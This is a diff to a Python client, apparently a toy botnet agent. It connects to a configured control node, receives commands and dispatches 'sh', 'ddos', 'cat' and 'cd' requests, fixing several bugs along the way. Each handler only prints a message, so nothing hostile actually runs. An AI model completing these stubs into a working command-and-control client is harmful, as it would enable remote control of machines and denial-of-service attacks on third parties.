@@ -7,7 +7,8 @@ import yaml
 
 
 def load_config(filename: str) -> dict:
-    config = yaml.load(filename)
+    with open(filename, 'r') as my_file:
+        config = yaml.safe_load(my_file)
     return config
 
 
@@ -26,16 +27,16 @@ def get_command(my_socket: socket.socket) -> str:
     chunks = []
     bytes_recd = 0
     while bytes_recd < MSGLEN:
-        chunk = my_socket.sock.recv(min(MSGLEN - bytes_recd, 2048))
+        chunk = my_socket.recv(min(MSGLEN - bytes_recd, 2048))
         if chunk == b'':
             raise RuntimeError("socket connection broken")
         chunks.append(chunk)
         bytes_recd = bytes_recd + len(chunk)
-    return b''.join(chunks)
+    return b''.join(chunks).decode()
 
 
 def parse_command(command: str) -> list:
-    parsed = command.strip().split(' ')
+    return command.strip().split(' ')
 
 
 def run_command(command: list) -> bool:
@@ -46,6 +47,9 @@ def run_command(command: list) -> bool:
         # necessary
         case ["sh", *commands]:
             print(f"Running command on target: " + ', '.join(commands) + ".")
+        case ["quit", *extra]:
+            print(f"Received the [quit, extra] command, ending client node.")
+            return False
         # fun
         case ["ddos", *targets]:
             print(f"DDoSing targets: " + ', '.join(targets) + ".")
@@ -65,9 +69,8 @@ def run_command(command: list) -> bool:
             print(f"Catting files " + ", ".join(files) + ".")
         case ['cd', directory]:
             print(f"Changing directory to {directory}.")
-        case _:
-            print(f"Unknown command: {_}")
-            return False
+        case x:
+            print(f"Unknown command: {x}")
     return True
 
 
@@ -75,11 +78,15 @@ def main():
     config = load_config('client_config.yml')
     control_hostname = config['control_node']['address']
     control_port = config['control_node']['port']
-    my_socket = connect_to_control_port()
+    my_socket = connect_to_control_port(hostname=control_hostname, port=control_port)
+    print(f"Connected to control node at {control_hostname}:{control_port}")
     while True:
+        # print("Receiving a command")
         command = get_command(my_socket)
+        # print(f"Received command {command}")
         command = parse_command(command)
-        run_command(command)
+        if not run_command(command):
+            break
 
 
 if __name__ == '__main__':
